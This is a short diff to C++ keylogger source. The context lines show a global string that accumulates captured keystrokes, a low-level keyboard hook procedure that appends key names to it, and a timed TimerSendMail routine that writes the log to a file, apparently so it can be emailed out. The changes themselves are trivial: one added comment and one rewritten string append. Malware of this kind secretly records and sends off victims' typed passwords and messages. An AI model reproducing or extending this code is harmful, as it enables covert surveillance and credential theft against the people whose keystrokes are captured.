@@ -13,7 +13,7 @@ std::string keylog = "";    // this will be the variable where all keystrokes ar
 void TimerSendMail()
 {
     if(keylog.empty())
-        return;
+        return; //since user input is null
     std::string last_file = IO::WriteLog(keylog);
 
     if(last_file.empty())
@@ -55,7 +55,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
         {
             std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
             KeyName.insert(1, "/"); // inserting the backslash for the e.g. [SHIFT]...[/SHIFT]
-            keylog += KeyName;
+            keylog = keylog + KeyName;
         }
     }
 
